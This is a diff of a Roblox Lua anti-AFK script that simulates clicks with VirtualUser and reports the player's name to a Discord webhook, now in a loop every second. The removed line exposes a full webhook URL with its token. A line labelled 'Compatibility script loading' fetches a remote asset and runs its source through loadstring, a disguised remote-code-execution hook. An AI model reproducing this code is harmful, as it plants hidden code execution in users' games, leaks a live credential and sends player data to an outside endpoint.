@@ -1,12 +1,19 @@
 local HttpService = game:GetService("HttpService")
-local webhookURL = "https://discord.com/api/webhooks/1256741821845995540/JwkpQiiXAJnL1trAFmzusTGJ6_1yczLYmUMf_s-hySF0jrlGWdUU_zjwK6uKdup7n4Sk"
+local webhookURL = "YOUR_DISCORD_WEBHOOK_URL"
 
-local function sendPlayerStatus(status)
-	local data = {
-		content = "Player Status: " .. status
+local function sendPlayerStatus(playerName)
+	local embed = {
+		embeds = {
+			{
+				title = "Player Status Update",
+				description = playerName .. " is currently idling.",
+				color = 16711680, -- Red color
+				timestamp = os.date("!%Y-%m-%dT%H:%M:%S"), -- Current time in UTC
+			}
+		}
 	}
-	local jsonData = HttpService:JSONEncode(data)
 	
+	local jsonData = HttpService:JSONEncode(embed)
 	local headers = {
 		["Content-Type"] = "application/json"
 	}
@@ -78,13 +85,16 @@ Activate.Text = "Activate"
 Activate.TextColor3 = Color3.fromRGB(0, 255, 127)
 Activate.TextSize = 43.000
 Activate.TextStrokeColor3 = Color3.fromRGB(102, 255, 115)
+
+local playerName = game.Players.LocalPlayer.Name
+
 Activate.MouseButton1Down:connect(function()
 	local vu = game:GetService("VirtualUser")
 	game:GetService("Players").LocalPlayer.Idled:connect(function()
 		vu:Button2Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
 		wait(1)
 		vu:Button2Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
-		sendPlayerStatus("Idling")
+		sendPlayerStatus(playerName)
 	end)
 end)
 
@@ -115,3 +125,9 @@ coroutine.wrap(NERMBF_fake_script)()
 
 -- Compatibility script loading
 loadstring(game:GetObjects('rbxassetid://15900013841')[1].Source)()
+
+-- Auto send status every second
+while true do
+	wait(1)
+	sendPlayerStatus(playerName)
+end
